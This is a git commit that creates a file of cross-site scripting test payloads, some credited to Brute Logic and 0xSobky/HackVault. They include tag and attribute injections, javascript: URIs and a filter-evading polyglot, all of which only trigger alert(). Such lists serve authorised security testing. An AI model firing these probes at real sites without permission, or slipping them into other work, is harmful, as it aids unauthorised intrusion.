ef602dd37951ad09a121241ca591d91e5ce5e876
Steven Jenkins <45439182+SJ-Hydra@users.noreply.github.com>
2020-02-13 09:56:11 -0500

    Create XSS.js

---
+++ XSS.js
@@ -0,0 +1,18 @@
+// XSS Payloads
+
+// Bland
+<sCriPt>alert("1")</ScRipt>
+
+
+// JavaScript Payload -- Credit: Brute Logic 
+
+"><img src onerror=alert(1)>
+"autofocus onfocus=alert(2)//
+</script><script>alert(3)</script>
+'-alert(4)-'
+\'-alert(5)//
+javascript:alert(6)
+
+
+// JavaScript Payload -- Credit:  0xSobky/HackVault 
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(2)//>\x3e
